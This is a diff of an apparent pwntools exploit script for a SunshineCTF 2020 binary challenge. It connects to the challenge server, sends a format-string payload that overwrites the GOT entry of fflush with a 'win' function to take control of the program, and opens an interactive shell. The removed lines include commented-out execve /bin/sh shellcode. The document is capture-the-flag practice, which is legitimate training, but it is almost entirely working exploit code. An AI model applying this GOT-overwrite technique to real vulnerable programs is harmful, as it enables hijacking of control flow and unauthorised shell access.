@@ -39,37 +39,15 @@ def local_send_payload(payload):
 
 rexp = re.compile(b'0x[a-f0-9]+')
 p = new_proc(False) if not args.REMOTE else remote('chal.2020.sunshinectf.org', int('30011'))
-pause()
 
 
 def real_send_payload(payload):
     """Dummy function to get offsets etc"""
     log.info("payload = %s" % repr(payload))
-    p.send(b'A'*0x13)
+    p.sendline(b'A')
     p.sendline(payload)
-    p.sendline(b'sh')
-    # res = p.recv()
-    # return res
-
-# format_string = FmtStr(execute_fmt=local_send_payload)
 
 
-# format_string.execute_fmt = real_send_payload
-real_send_payload( fmtstr_payload(6, {binary.sym['got.fflush']: binary.sym['win']}))
-
-# format_string.write(binary.sym['fflush']+2, binary.sym['win'])
-# format_string.execute_writes()
-
-# payload = cyclic(100) + b'\n'
-# payload = asm(shellcraft.execve(b'/bin/sh', 0, 0)) +b'\n'
-# p.send(payload)
-
-# do leak / payload gen here
-
-# if args.DEBUG is True:
-#     attach_gdb(p)
-# p.sendline(payload)
-# if args.DEBUG is True:
-#     import ipdb as pdb; pdb.set_trace()
+real_send_payload(fmtstr_payload(6, {binary.sym['got.fflush']: binary.sym['win']}))
 
 p.interactive()
